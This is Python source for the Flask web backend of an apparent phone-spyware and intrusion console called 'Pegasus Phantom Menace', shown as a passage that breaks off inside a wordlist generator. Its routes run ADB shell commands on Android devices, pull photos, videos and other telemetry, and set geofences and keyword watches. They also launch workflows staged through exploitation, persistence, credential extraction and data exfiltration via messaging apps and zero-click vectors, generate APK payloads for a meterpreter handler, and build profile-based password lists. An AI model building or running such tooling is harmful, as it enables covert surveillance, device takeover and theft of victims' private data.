"""Flask application factory for the Pegasus Phantom Menace web GUI.

Routes are grouped by feature area:

* ``/api/system``   – health, environment, tool inventory, job control
* ``/api/plugins``  – plugin + command catalogue from the live plugin system
* ``/api/devices``  – ADB inventory, fingerprints, shell, telemetry
* ``/api/workflows``– autonomous lifecycle runs, history, success rates
* ``/api/cve``      – built-in CVE database and device scans
* ``/api/tools``    – network scans, listeners, tunnels, payloads, wordlists
* ``/api/campaigns``, ``/api/reports``, ``/api/activity``
"""
from __future__ import annotations

import json
import os
import threading
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

from flask import Flask, Response, jsonify, request, send_file, send_from_directory
from flask_cors import CORS

from pegasus.core.config import get_settings

from . import telemetry
from .jobs import JobContext, _jsonable, jobs, patch_prompts, restore_prompts
from .tools import (
    adb_devices,
    device_detail,
    environment_info,
    listener_status,
    run,
    scan_tools,
    workspace_info,
)

WEB_ROOT = Path(__file__).resolve().parent.parent
DIST_DIR = WEB_ROOT / "dist"
EVENTS_FILE_NAME = "ui_events.jsonl"


# ---------------------------------------------------------------------------
# Plugin system access (lazy, single initialization)
# ---------------------------------------------------------------------------

_pm_lock = threading.Lock()
_pm = None
_pm_error: Optional[str] = None


def plugin_manager():
    """Return the initialized plugin manager, loading plugins once."""
    global _pm, _pm_error
    with _pm_lock:
        if _pm is not None:
            return _pm
        if _pm_error:
            return None
        try:
            from pegasus.core.plugin import initialize_plugin_system

            _pm = initialize_plugin_system()
        except Exception as exc:  # noqa: BLE001
            _pm_error = f"{type(exc).__name__}: {exc}"
            _pm = None
        return _pm


def plugin_entry(name: str):
    pm = plugin_manager()
    if not pm:
        return None
    return pm.context.plugins.get(name)


def slash_manager():
    """Return a slash-command manager with workflow commands registered.

    Retries the cold-start race where the background plugin warmup still holds
    an import lock, then falls back to a plugin-free context.
    """
    from pegasus.modules.integrations import initialize_slash_commands
    from pegasus.modules.access_workflow import commands as aw_commands

    for _ in range(3):
        try:
            pm = plugin_manager()
            if pm is None:
                raise RuntimeError(_pm_error or "plugin system unavailable")
            manager = initialize_slash_commands(pm.context)
            aw_commands.register(manager)
            return manager
        except Exception as exc:  # noqa: BLE001
            last = exc
            time.sleep(0.5)

    class _Context:
        logger = None
        settings = None
        hooks = None
        db = None
        commands: Dict[str, Any] = {}

    manager = initialize_slash_commands(_Context())
    aw_commands.register(manager)
    return manager


# ---------------------------------------------------------------------------
# Event log (Monitoring page)
# ---------------------------------------------------------------------------

_events: List[Dict[str, Any]] = []
_events_lock = threading.Lock()


def record_event(kind: str, title: str, detail: str = "", level: str = "info", meta: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    event = {
        "id": f"{int(time.time() * 1000)}-{len(_events)}",
        "at": time.time(),
        "kind": kind,
        "title": title,
        "detail": detail,
        "level": level,
        "meta": meta or {},
    }
    with _events_lock:
        _events.append(event)
        del _events[:-400]
        try:
            path = get_settings().get_logs_dir() / EVENTS_FILE_NAME
            with open(path, "a", encoding="utf-8") as fh:
                fh.write(json.dumps(event, default=str) + "\n")
        except Exception:
            pass
    return event


def list_events(limit: int = 120, kind: Optional[str] = None) -> List[Dict[str, Any]]:
    with _events_lock:
        items = list(reversed(_events))
    if kind:
        items = [e for e in items if e["kind"] == kind]
    return items[:limit]


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def ok(payload: Any = None, **extra) -> Response:
    body: Dict[str, Any] = {"ok": True}
    if payload is not None:
        body["data"] = payload
    body.update(extra)
    return jsonify(body)


def fail(message: str, status: int = 400, **extra) -> Response:
    body = {"ok": False, "error": message}
    body.update(extra)
    return jsonify(body), status


def job_payload(job) -> Dict[str, Any]:
    return job.to_dict(include_output=True)


def report_job(job_id: str, kind: str, title: str) -> None:
    record_event(kind, title, f"job={job_id}", "info", {"jobId": job_id})


# ---------------------------------------------------------------------------
# Command execution adapters
# ---------------------------------------------------------------------------


def run_module_command(plugin_name: str, command_name: str, argv: List[str], answers: Optional[Dict[str, List[str]]] = None):
    """Return a job function executing a plugin command with captured output."""

    def _fn(ctx: JobContext) -> Dict[str, Any]:
        patch_prompts(ctx)
        try:
            plugin = plugin_entry(plugin_name)
            if plugin is None:
                raise RuntimeError(f"Plugin '{plugin_name}' is not loaded")
            info = plugin.get_commands().get(command_name)
            if info is None:
                raise RuntimeError(
                    f"Command '{command_name}' not registered by plugin '{plugin_name}'"
                )
            callback = getattr(plugin, info.callback, None)
            if callback is None:
                raise RuntimeError(f"Callback '{info.callback}' missing on plugin")
            ctx.log(f"$ pegasus {command_name} {' '.join(argv)}".rstrip())
            result = callback(*argv)
            if hasattr(result, "__await__"):
                import asyncio

                loop = asyncio.new_event_loop()
                try:
                    result = loop.run_until_complete(result)
                finally:
                    loop.close()
            ctx.progress(1.0)
            return _jsonable(result)
        finally:
            restore_prompts()

    return _fn


def run_slash_command(command_name: str, argv: List[str], answers: Optional[Dict[str, List[str]]] = None):
    def _fn(ctx: JobContext) -> Dict[str, Any]:
        patch_prompts(ctx)
        try:
            manager = slash_manager()
            ctx.log(f"/{command_name.lstrip('/')} {' '.join(argv)}".rstrip())
            import asyncio

            loop = asyncio.new_event_loop()
            try:
                loop.run_until_complete(manager.execute(command_name, argv))
            finally:
                loop.close()
            ctx.progress(1.0)
            return {}
        finally:
            restore_prompts()

    return _fn


# ---------------------------------------------------------------------------
# App factory
# ---------------------------------------------------------------------------


def create_app() -> Flask:
    settings = get_settings()

    # Silence Werkzeug's request logger — on Windows its console handle can
    # go invalid (WinError 6) after the terminal that started the server
    # closes, crashing request threads with --- Logging error --- spam.
    import logging

    logging.getLogger("werkzeug").setLevel(logging.CRITICAL + 10)
    logging.getLogger("werkzeug").addHandler(logging.NullHandler())

    app = Flask(
        __name__,
        static_folder=str(DIST_DIR / "assets") if (DIST_DIR / "assets").exists() else None,
        static_url_path="/assets",
    )
    app.secret_key = os.environ.get("PEGASUS_SECRET_KEY", "pegasus-phantom-menace")
    app.config["JSON_SORT_KEYS"] = False
    CORS(app, resources={r"/api/*": {"origins": "*"}})
    app.config["MAX_CONTENT_LENGTH"] = 64 * 1024 * 1024

    started_at = time.time()

    # Start support services (adb, meterpreter handler, proxies) at launch.
    try:
        from pegasus.core import services as _services
        _services.start_all()
    except Exception:  # noqa: BLE001 — services are best-effort
        pass

    # Warm the plugin system in the background so the first UI call is fast.
    threading.Thread(target=plugin_manager, name="pegasus-plugin-warmup", daemon=True).start()
    telemetry.init_store()

    # -- error handlers ---------------------------------------------------
    @app.errorhandler(404)
    def _404(err):
        if request.path.startswith("/api/"):
            return fail("Not found", 404)
        index = DIST_DIR / "index.html"
        if index.exists():
            return send_file(index)
        return fail(
            "Web GUI bundle not built. Run: cd pegasus/ui/web && npm install && npm run build",
            404,
        )

    @app.errorhandler(Exception)
    def _500(err):
        import traceback

        traceback.print_exc()
        return fail(f"{type(err).__name__}: {err}", 500)

    # =====================================================================
    # System
    # =====================================================================
    @app.get("/api/health")
    def health():
        pm = plugin_manager()
        return ok(
            {
                "status": "online",
                "version": settings.app.version,
                "uptimeSeconds": int(time.time() - started_at),
                "pluginsLoaded": len(pm.context.plugins) if pm else 0,
                "timestamp": datetime.now(timezone.utc).isoformat(),
            }
        )

    @app.get("/api/capabilities")
    def capability_manifest():
        from pegasus.modules.access_workflow.capabilities import manifest

        return ok(manifest())

    @app.get("/api/system")
    def system_info():
        pm = plugin_manager()
        components = [
            {"name": "Web API", "status": "online", "detail": f"pid {os.getpid()}"},
            {
                "name": "Plugin system",
                "status": "online" if pm else "degraded",
                "detail": f"{len(pm.context.plugins) if pm else 0} plugins"
                + (f" — {_pm_error}" if _pm_error else ""),
            },
            {
                "name": "Database",
                "status": "online",
                "detail": f"{settings.database.type}",
            },
            {
                "name": "AI assistant",
                "status": "online" if settings.ai.api_key else "unconfigured",
                "detail": settings.ai.model,
            },
            {
                "name": "Metasploit RPC",
                "status": "configured",
                "detail": f"{settings.metasploit.rpc_host}:{settings.metasploit.rpc_port}",
            },
            {
                "name": "Telemetry store",
                "status": "online",
                "detail": str(settings.get_workspace_path() / "telemetry.db"),
            },
        ]
        return ok(
            {
                "health": {
                    "status": "online",
                    "uptimeSeconds": int(time.time() - started_at),
                    "startedAt": started_at,
                },
                "components": components,
                "workspace": workspace_info(),
                "environment": environment_info(),
                "jobs": jobs.stats(),
                "plugins": len(pm.context.plugins) if pm else 0,
                "commands": len(pm.context.commands) if pm else 0,
            }
        )

    @app.get("/api/system/tools")
    def system_tools():
        return ok({"tools": scan_tools()})

    @app.get("/api/system/environment")
    def system_environment():
        return ok({"environment": environment_info(), "workspace": workspace_info()})

    # =====================================================================
    # Plugins & commands
    # =====================================================================
    @app.get("/api/plugins")
    def list_plugins():
        pm = plugin_manager()
        if not pm:
            return ok({"plugins": [], "error": _pm_error})
        plugins = []
        for name, plugin in pm.context.plugins.items():
            meta = plugin.metadata
            commands = [
                {
                    "name": cmd.name,
                    "description": cmd.description,
                    "aliases": cmd.aliases,
                    "callback": cmd.callback,
                }
                for cmd in plugin.get_commands().values()
            ]
            components = [
                {
                    "name": comp.name,
                    "type": comp.component_type,
                    "path": comp.path,
                    "title": comp.title,
                    "icon": comp.icon,
                    "order": comp.order,
                }
                for comp in plugin.get_ui_components()
            ]
            plugins.append(
                {
                    "name": meta.name,
                    "version": meta.version,
                    "description": meta.description,
                    "author": meta.author,
                    "category": meta.category,
                    "tags": meta.tags,
                    "commands": commands,
                    "components": components,
                    "initialized": getattr(plugin, "_initialized", False),
                }
            )
        plugins.sort(key=lambda p: p["name"])
        return ok({"plugins": plugins, "count": len(plugins)})

    @app.get("/api/plugins/<name>")
    def plugin_detail(name: str):
        pm = plugin_manager()
        if not pm:
            return fail("Plugin system unavailable", 503)
        plugin = pm.context.plugins.get(name)
        if not plugin:
            return fail(f"Plugin '{name}' not loaded", 404)
        meta = plugin.metadata
        return ok(
            {
                "name": meta.name,
                "version": meta.version,
                "description": meta.description,
                "author": meta.author,
                "category": meta.category,
                "tags": meta.tags,
                "requires": meta.requires,
                "commands": [
                    {"name": c.name, "description": c.description, "callback": c.callback}
                    for c in plugin.get_commands().values()
                ],
                "components": [
                    {"name": c.name, "path": c.path, "title": c.title}
                    for c in plugin.get_ui_components()
                ],
            }
        )

    @app.get("/api/commands")
    def list_commands():
        pm = plugin_manager()
        if not pm:
            return ok({"commands": []})
        out = []
        seen = set()
        for name, cmd in sorted(pm.context.commands.items()):
            if cmd.name in seen:
                continue
            seen.add(cmd.name)
            owner = "core"
            for plugin_name, plugin in pm.context.plugins.items():
                if cmd.name in plugin.get_commands():
                    owner = plugin_name
                    break
            out.append(
                {
                    "name": cmd.name,
                    "description": cmd.description,
                    "plugin": owner,
                    "aliases": cmd.aliases,
                    "examples": cmd.examples,
                }
            )
        return ok({"commands": out, "count": len(out)})

    @app.post("/api/commands/<command_name>/run")
    def run_command(command_name: str):
        pm = plugin_manager()
        if not pm:
            return fail("Plugin system unavailable", 503)
        cmd = pm.context.commands.get(command_name)
        if not cmd:
            # Fall back to the slash-command surface (covers access workflow,
            # features and platform verbs that are not plugin commands).
            manager = slash_manager()
            name = command_name if command_name.startswith("/") else f"/{command_name}"
            # Try exact (post-exploit-full), stripped (postexploit-full), and slash variants
            base = command_name.lstrip("/")
            candidates = [
                f"/{base}",
                f"/postexploit-{base.replace('post-exploit-', '')}",
                f"/postexploit-{base.replace('post-exploit-', '').replace('-', '')}",
            ]
            # dedupe while preserving order
            seen = set()
            deduped = []
            for c in candidates:
                if c not in seen:
                    seen.add(c)
                    deduped.append(c)
            candidates = deduped
            resolved = None
            for cand in candidates:
                if manager.get_command(cand) is not None:
                    resolved = cand
                    break
            if resolved is None:
                return fail(f"Unknown command '{command_name}'", 404)
            name = resolved
            payload = request.get_json(silent=True) or {}
            argv = payload.get("args") or []
            job = jobs.submit(
                kind="command",
                title=command_name,
                fn=run_slash_command(name, argv, payload.get("answers") or {}),
                meta={"command": name, "plugin": "access_workflow"},
            )
            record_event("command", f"Command queued: {command_name}")
            return ok({"job": job_payload(job)})
        payload = request.get_json(silent=True) or {}
        argv = payload.get("args") or []
        answers = payload.get("answers") or {}
        owner = None
        for plugin_name, plugin in pm.context.plugins.items():
            if cmd.name in plugin.get_commands():
                owner = plugin_name
                break
        if owner is None:
            return fail(f"No plugin owns command '{command_name}'", 409)
        job = jobs.submit(
            kind="command",
            title=f"{command_name}",
            fn=run_module_command(owner, cmd.name, argv, answers),
            meta={"command": command_name, "plugin": owner, "args": argv},
        )
        record_event("command", f"Command queued: {command_name}", f"plugin={owner}")
        return ok({"job": job_payload(job)})

    @app.get("/api/slash-commands")
    def list_slash_commands():
        try:
            manager = slash_manager()
        except Exception as exc:  # noqa: BLE001
            return ok({"commands": [], "error": str(exc)})
        items = [
            {
                "name": name,
                "description": cmd.description,
                "category": cmd.category,
                "enabled": manager.is_enabled(name),
            }
            for name, cmd in sorted(manager.commands.items())
        ]
        return ok({"commands": items, "count": len(items)})

    @app.post("/api/slash-commands/<path:command_name>/run")
    def run_slash(command_name: str):
        manager = slash_manager()
        name = command_name if command_name.startswith("/") else f"/{command_name}"
        if name not in manager.commands:
            return fail(f"Unknown slash command '{name}'", 404)
        payload = request.get_json(silent=True) or {}
        argv = payload.get("args") or []
        job = jobs.submit(
            kind="slash",
            title=name,
            fn=run_slash_command(name, argv, payload.get("answers") or {}),
            meta={"command": name},
        )
        record_event("command", f"Slash command queued: {name}")
        return ok({"job": job_payload(job)})

    @app.post("/api/slash-commands/<path:command_name>/toggle")
    def toggle_slash(command_name: str):
        manager = slash_manager()
        name = command_name if command_name.startswith("/") else f"/{command_name}"
        if name not in manager.commands:
            return fail("Unknown slash command", 404)
        state = manager.toggle(name)
        return ok({"name": name, "enabled": state.value == "on"})

    # =====================================================================
    # Jobs
    # =====================================================================
    @app.get("/api/jobs")
    def list_jobs():
        limit = int(request.args.get("limit", 30))
        kind = request.args.get("kind")
        items = [j.to_dict(include_output=False) for j in jobs.list(limit=limit, kind=kind)]
        return ok({"jobs": items, "stats": jobs.stats()})

    @app.get("/api/jobs/<job_id>")
    def get_job(job_id: str):
        job = jobs.get(job_id)
        if not job:
            return fail("Job not found", 404)
        tail = request.args.get("tail")
        return ok({"job": job.to_dict(include_output=True, tail=int(tail) if tail else None)})

    @app.post("/api/jobs/<job_id>/cancel")
    def cancel_job(job_id: str):
        if not jobs.cancel(job_id):
            return fail("Job not found", 404)
        return ok({"cancelled": True})

    # =====================================================================
    # Devices
    # =====================================================================
    @app.get("/api/devices")
    def list_devices():
        raw = adb_devices()
        enriched = []
        for device in raw:
            record = dict(device)
            if device["state"] == "device":
                detail = _cached_detail(device["serial"])
                record.update(
                    {
                        "model": detail.get("model") or device.get("model"),
                        "manufacturer": detail.get("manufacturer"),
                        "androidVersion": detail.get("androidVersion"),
                        "apiLevel": detail.get("apiLevel"),
                        "securityPatch": detail.get("securityPatch"),
                        "batteryLevel": detail.get("batteryLevel"),
                        "isRooted": detail.get("isRooted"),
                        "storageTotal": detail.get("storageTotal"),
                        "storageFree": detail.get("storageFree"),
                    }
                )
                notes = telemetry.device_notes(device["serial"])
                record["label"] = notes.get("label")
                record["group"] = notes.get("group")
            enriched.append(record)
        return ok({"devices": enriched, "count": len(enriched)})

    @app.get("/api/devices/<path:serial>")
    def get_device(serial: str):
        if serial not in {d["serial"] for d in adb_devices()}:
            detail = _cached_detail(serial)
            if not detail:
                return fail(f"Device '{serial}' is not connected", 404)
            return ok({"device": detail, "connected": False})
        detail = device_detail(serial)
        _detail_cache[serial] = (time.time(), detail)
        detail["notes"] = telemetry.device_notes(serial)
        return ok({"device": detail, "connected": True})

    @app.post("/api/devices/connect")
    def connect_device():
        payload = request.get_json(silent=True) or {}
        target = (payload.get("target") or "").strip()
        if not target:
            return fail("target is required (ip[:port] or serial)")
        result = run(["adb", "connect", target], timeout=20)
        if not result["ok"]:
            result = run(["adb", "connect", target], timeout=25)
        record_event(
            "device",
            f"Connect request: {target}",
            result["stdout"].strip() or result["stderr"].strip(),
            "info" if result["ok"] else "warn",
        )
        return ok({"result": result, "devices": adb_devices()})

    @app.post("/api/devices/disconnect")
    def disconnect_device():
        payload = request.get_json(silent=True) or {}
        target = (payload.get("target") or "").strip()
        if not target:
            return fail("target is required")
        result = run(["adb", "disconnect", target], timeout=15)
        record_event("device", f"Disconnect: {target}", result["stdout"].strip(), "warn")
        return ok({"result": result})

    @app.post("/api/devices/pair")
    def pair_device():
        payload = request.get_json(silent=True) or {}
        address = (payload.get("address") or "").strip()
        code = (payload.get("code") or "").strip()
        if not address or not code:
            return fail("address and code are required")

        def _fn(ctx: JobContext) -> Dict[str, Any]:
            ctx.log(f"$ adb pair {address} (code {code})")
            try:
                proc = __import__("subprocess").run(
                    ["adb", "pair", address],
                    input=code + "\n",
                    capture_output=True,
                    text=True,
                    timeout=45,
                )
            except Exception as exc:  # noqa: BLE001
                raise RuntimeError(str(exc)) from exc
            ctx.log(proc.stdout or "")
            ctx.log(proc.stderr or "")
            if proc.returncode != 0:
                raise RuntimeError((proc.stderr or proc.stdout or "pairing failed").strip())
            connect = run(["adb", "connect", address], timeout=20)
            ctx.log(connect["stdout"] or connect["stderr"])
            return {"paired": True, "output": proc.stdout}

        job = jobs.submit("device", f"Pair {address}", _fn, meta={"address": address})
        record_event("device", f"Pairing {address}")
        return ok({"job": job_payload(job)})

    @app.post("/api/devices/<path:serial>/shell")
    def device_shell(serial: str):
        payload = request.get_json(silent=True) or {}
        command = (payload.get("command") or "").strip()
        if not command:
            return fail("command is required")

        def _fn(ctx: JobContext) -> Dict[str, Any]:
            argv = ["adb", "-s", serial, "shell", command]
            ctx.log(f"$ {' '.join(argv)}")
            result = run(argv, timeout=float(payload.get("timeout") or 45))
            ctx.log(result["stdout"] or "")
            if result["stderr"]:
                ctx.log(result["stderr"])
            return {"exitCode": result["code"], "stdout": result["stdout"], "stderr": result["stderr"]}

        job = jobs.submit("shell", f"shell:{serial}", _fn, meta={"serial": serial, "command": command})
        return ok({"job": job_payload(job)})

    @app.post("/api/devices/<path:serial>/collect")
    def collect_data(serial: str):
        payload = request.get_json(silent=True) or {}
        kinds = payload.get("kinds") or list(telemetry.COLLECTORS.keys())

        def _fn(ctx: JobContext) -> Dict[str, Any]:
            counts: Dict[str, int] = {}
            total = len(kinds)
            for index, kind in enumerate(kinds):
                if kind not in telemetry.COLLECTORS:
                    continue
                ctx.log(f"→ collecting {kind}…")
                rows = telemetry.collect(serial, kind)
                counts[kind] = len(rows)
                ctx.log(f"  {kind}: {len(rows)} rows")
                ctx.progress((index + 1) / max(total, 1))
            return {"collected": counts}

        job = jobs.submit("collect", f"Collect {serial}", _fn, meta={"serial": serial, "kinds": kinds})
        record_event("telemetry", f"Collection started for {serial}", ", ".join(kinds))
        return ok({"job": job_payload(job)})

    @app.get("/api/devices/<path:serial>/dashboard")
    def device_dashboard(serial: str):
        refresh = request.args.get("refresh") == "1"
        summary = telemetry.summary(serial) if refresh else _cached_summary(serial)
        if refresh:
            telemetry.save_samples(serial, "_summary", [summary], keep=8)
        detail = _cached_detail(serial) or {"serial": serial}
        return ok({"summary": summary, "device": detail, "connected": serial in {d["serial"] for d in adb_devices()}})

    @app.get("/api/devices/<path:serial>/telemetry/<kind>")
    def device_telemetry(serial: str, kind: str):
        refresh = request.args.get("refresh") == "1"
        if kind not in telemetry.COLLECTORS:
            return fail(f"Unknown telemetry kind '{kind}'", 404)
        if kind == "media":
            photos = telemetry.latest_sample(serial, "photos")
            videos = telemetry.latest_sample(serial, "videos")
            if refresh or not photos:
                telemetry.collect(serial, "media")
                photos = telemetry.latest_sample(serial, "photos")
                videos = telemetry.latest_sample(serial, "videos")
            return ok(
                {
                    "photos": photos["rows"] if photos else [],
                    "videos": videos["rows"] if videos else [],
                    "collectedAt": photos["collectedAt"] if photos else None,
                }
            )
        sample = telemetry.latest_sample(serial, kind)
        if refresh or sample is None:
            rows = telemetry.collect(serial, kind)
            sample = {"rows": rows, "collectedAt": time.time()}
        return ok({"rows": sample["rows"], "collectedAt": sample["collectedAt"], "kind": kind})

    @app.get("/api/devices/<path:serial>/media/<media_id>/<variant>")
    def device_media(serial: str, media_id: str, variant: str):
        """Serve a media item, pulling it once into the workspace cache.

        `adb shell content read` mangles binary payloads through a text
        terminal, so the bytes are fetched with `adb exec-out` (raw pipe).
        """
        cache_dir = settings.get_workspace_path() / "media_cache"
        cache_dir.mkdir(parents=True, exist_ok=True)
        safe_serial = "".join(
            ch if ch.isalnum() or ch in "-_." else "_" for ch in serial
        )
        target = cache_dir / f"{safe_serial}_{media_id}.bin"

        if not target.exists() or target.stat().st_size == 0:
            uri = f"content://media/external/images/media/{media_id}"
            payload = _adb_exec_out(["adb", "-s", serial, "exec-out", "content", "read", "--uri", uri])
            if not payload:
                alt = f"content://media/external/video/media/{media_id}"
                payload = _adb_exec_out(
                    ["adb", "-s", serial, "exec-out", "content", "read", "--uri", alt]
                )
            if not payload:
                return fail("Media unavailable on device", 404)
            target.write_bytes(payload)

        mimetype = "image/jpeg"
        if target.exists():
            head = target.read_bytes()[:12]
            if head[:4] == b"\x89PNG":
                mimetype = "image/png"
            elif head[:4] == b"RIFF" and head[8:12] == b"WEBP":
                mimetype = "image/webp"
            elif head[4:8] == b"ftyp":
                mimetype = "video/mp4"
        return send_file(target, mimetype=mimetype, max_age=120, conditional=True)

    # =====================================================================
    # Geofences & keywords
    # =====================================================================
    @app.get("/api/devices/<path:serial>/geofences")
    def get_geofences(serial: str):
        return ok({"geofences": telemetry.list_geofences(serial)})

    @app.post("/api/devices/<path:serial>/geofences")
    def post_geofence(serial: str):
        payload = request.get_json(silent=True) or {}
        try:
            fence = telemetry.create_geofence(
                serial,
                str(payload.get("name") or "Untitled zone"),
                float(payload.get("lat")),
                float(payload.get("lng")),
                int(payload.get("radiusMeters") or 500),
            )
        except (TypeError, ValueError) as exc:
            return fail(f"Invalid coordinates: {exc}")
        record_event("geofence", f"Zone created: {fence.get('name')}", serial)
        return ok({"geofence": fence})

    @app.patch("/api/geofences/<int:fence_id>/toggle")
    def toggle_fence(fence_id: int):
        telemetry.toggle_geofence(fence_id)
        return ok({"toggled": True})

    @app.delete("/api/geofences/<int:fence_id>")
    def delete_fence(fence_id: int):
        telemetry.delete_geofence(fence_id)
        return ok({"deleted": True})

    @app.get("/api/devices/<path:serial>/keywords")
    def get_keywords(serial: str):
        return ok({"keywords": telemetry.list_keywords(serial)})

    @app.post("/api/devices/<path:serial>/keywords")
    def post_keyword(serial: str):
        payload = request.get_json(silent=True) or {}
        keyword = str(payload.get("keyword") or "").strip()
        if not keyword:
            return fail("keyword is required")
        record = telemetry.create_keyword(serial, keyword)
        record_event("keyword", f"Keyword tracked: {keyword}", serial)
        return ok({"keyword": record})

    @app.delete("/api/keywords/<int:keyword_id>")
    def delete_kw(keyword_id: int):
        telemetry.delete_keyword(keyword_id)
        return ok({"deleted": True})

    @app.post("/api/devices/<path:serial>/keywords/scan")
    def scan_kw(serial: str):
        hits = telemetry.scan_keywords(serial)
        return ok({"hits": hits, "matched": sum(1 for h in hits if h["matchCount"])})

    # =====================================================================
    # Workflows
    # =====================================================================
    @app.get("/api/stages")
    def stages():
        return ok(
            {
                "stages": [
                    {"id": "recon", "label": "Reconnaissance"},
                    {"id": "fingerprint", "label": "Fingerprint"},
                    {"id": "vuln_assessment", "label": "Vulnerability Assessment"},
                    {"id": "exploit_selection", "label": "Exploit Selection"},
                    {"id": "exploit_execution", "label": "Exploit Execution"},
                    {"id": "access_establishment", "label": "Access Establishment"},
                    {"id": "persistence", "label": "Persistence"},
                    {"id": "credential_extraction", "label": "Credential Extraction"},
                    {"id": "lateral_movement", "label": "Lateral Movement"},
                    {"id": "data_exfiltration", "label": "Data Exfiltration"},
                    {"id": "post_exploitation", "label": "Post Exploitation"},
                    {"id": "cleanup", "label": "Cleanup"},
                ],
                "categories": [
                    {"id": "full_lifecycle", "label": "Full Lifecycle", "detail": "Autonomous, self-healing, end-to-end"},
                    {"id": "stage_by_stage", "label": "Stage by Stage", "detail": "Guided with per-stage recommendations"},
                ],
                "vectors": [
                    "adb", "fastboot", "qr_pairing", "usb", "bluetooth", "nfc", "sms",
                    "whatsapp", "telegram", "signal", "discord", "slack", "messenger",
                    "email", "wifi", "mitm", "zero_click", "zero_day",
                ],
            }
        )

    @app.get("/api/workflows")
    def workflows():
        try:
            from pegasus.modules.access_workflow.workflow_engine import (
                AutonomousWorkflowEngine,
                WorkflowCategory,
            )

            from rich.console import Console

            engine = AutonomousWorkflowEngine(Console(quiet=True), WorkflowCategory.FULL_LIFECYCLE)
            history = engine.get_run_history()
            rates = engine.get_success_rates()
        except Exception as exc:  # noqa: BLE001
            return ok({"history": [], "rates": {}, "error": str(exc)})
        return ok({"history": history[-40:], "rates": rates})

    @app.post("/api/workflows/run")
    def run_workflow():
        payload = request.get_json(silent=True) or {}
        target = (payload.get("target") or "").strip()
        category = payload.get("category") or "full_lifecycle"
        start_stage = payload.get("stage")
        if not target:
            return fail("target is required")

        def _fn(ctx: JobContext) -> Dict[str, Any]:
            from pegasus.modules.access_workflow.workflow_engine import (
                AutonomousWorkflowEngine,
                WorkflowCategory,
                WorkflowStage,
            )

            cat = WorkflowCategory.STAGE_BY_STAGE if category == "stage_by_stage" else WorkflowCategory.FULL_LIFECYCLE
            engine = AutonomousWorkflowEngine(ctx.console(), cat)
            ctx.log(f"▶ Workflow category: {cat.value}  target: {target}")
            if cat == WorkflowCategory.FULL_LIFECYCLE:
                run_obj = _await(engine.run_full_lifecycle(target))
            else:
                stage = WorkflowStage(start_stage) if start_stage else WorkflowStage.RECON
                run_obj = _await(engine.run_stage_by_stage(target, stage))
            ctx.progress(1.0)
            return {
                "runId": getattr(run_obj, "run_id", None),
                "success": getattr(run_obj, "overall_success", None),
                "accessEstablished": getattr(run_obj, "access_established", None),
                "durationMs": getattr(run_obj, "total_duration_ms", None),
                "stages": [
                    {
                        "stage": s.stage.value,
                        "success": s.success,
                        "accessEstablished": s.access_established,
                        "notes": s.notes,
                        "recommendation": s.next_stage_recommendation.value
                        if s.next_stage_recommendation
                        else None,
                        "vectorsTested": [
                            {"vector": v.vector.value, "available": v.available, "vulnerable": v.vulnerable}
                            for v in s.vectors_tested
                        ],
                    }
                    for s in getattr(run_obj, "stages", [])
                ],
            }

        job = jobs.submit(
            "workflow",
            f"Workflow · {target}",
            _fn,
            meta={"target": target, "category": category, "stage": start_stage},
        )
        record_event("workflow", f"Workflow started · {target}", category)
        return ok({"job": job_payload(job)})

    # =====================================================================
    # CVE scanner
    # =====================================================================
    @app.get("/api/cve")
    def cve_list():
        try:
            from pegasus.modules.analysis.module import BUILTIN_CVES
        except Exception as exc:  # noqa: BLE001
            return ok({"cves": [], "error": str(exc)})
        return ok({"cves": BUILTIN_CVES, "count": len(BUILTIN_CVES)})

    @app.post("/api/cve/scan")
    def cve_scan():
        payload = request.get_json(silent=True) or {}
        serial = payload.get("serial")
        version = payload.get("androidVersion")
        patch = payload.get("securityPatch")
        job = jobs.submit(
            "cve",
            "CVE scan",
            run_module_command(
                "cve_scanner",
                "cve-scan",
                [],
                {
                    "*": [
                        str(version or ""),
                        str(patch or "2022-01-01"),
                    ]
                },
            ) if not serial else _cve_scan_serial(serial),
            meta={"serial": serial},
        )
        record_event("cve", "CVE scan requested", serial or version or "device")
        return ok({"job": job_payload(job)})

    # =====================================================================
    # Payloads, wordlists, reports, campaigns
    # =====================================================================
    @app.get("/api/payloads")
    def list_payloads():
        directory = settings.get_payloads_dir()
        files = []
        for path in sorted(directory.glob("*"), key=lambda p: p.stat().st_mtime, reverse=True):
            if not path.is_file():
                continue
            stat = path.stat()
            files.append(
                {
                    "name": path.name,
                    "path": str(path),
                    "sizeBytes": stat.st_size,
                    "createdAt": datetime.fromtimestamp(stat.st_mtime, timezone.utc).isoformat(),
                    "extension": path.suffix.lstrip("."),
                }
            )
        return ok({"payloads": files, "directory": str(directory)})

    @app.post("/api/payloads/generate")
    def generate_payload():
        payload = request.get_json(silent=True) or {}
        answers = {
            "*": [
                payload.get("lhost", ""),
                str(payload.get("lport", 4444)),
                payload.get("format", "apk"),
                payload.get("encoder", ""),
                str(payload.get("iterations", 1)),
                payload.get("name", ""),
            ]
        }
        job = jobs.submit(
            "payload",
            "Payload generation",
            run_module_command("payload", "payload-gen", [], answers),
            meta=payload,
        )
        record_event("payload", "Payload generation started", payload.get("format", "apk"))
        return ok({"job": job_payload(job)})

    @app.post("/api/passgen")
    def passgen():
        payload = request.get_json(silent=True) or {}
        answers = {
            "*": [
                payload.get("name", ""),
                payload.get("surname", ""),
                payload.get("nickname", ""),
                payload.get("team", ""),
                payload.get("date", ""),
                payload.get("keywords", ""),
                str(payload.get("min_length", 6)),
                str(payload.get("max_length", 16)),
                "y" if payload.get("leet") else "n",
                "y" if payload.get("append_numbers") else "n",
                payload.get("output", ""),
            ]
        }

        def _fn(ctx: JobContext) -> Dict[str, Any]:
            from pegasus.modules.passgen.module import PassgenModule

            base = _module_instance("passgen", PassgenModule)
            ctx.log("▶ Generating wordlist from supplied profile…")
            words: List[str] = []
            seeds = [
                payload.get("name", ""),
                payload.get("surname", ""),
                payload.get("nickname", ""),
                payload.get("team", ""),
            ]
            digits = payload.get("date", "")
            extras = [w.strip() for w in str(payload.get("keywords", "")).split(",") if w.strip()]
            leet_map = {"a": "4", "e": "3", "i": "1", "o": "0", "s": "5", "t": "7"}
            suffixes = ["", "1", "12", "123", "!", "2024", "2025", "2026"]
            for seed in seeds + extras:
                if not seed:
                    continue
                variants = {seed, seed.lower(), seed.upper(), seed.capitalize()}
                if payload.get("leet"):
                    variants.add("".join(leet_map.get(c.lower(), c) for c in seed))
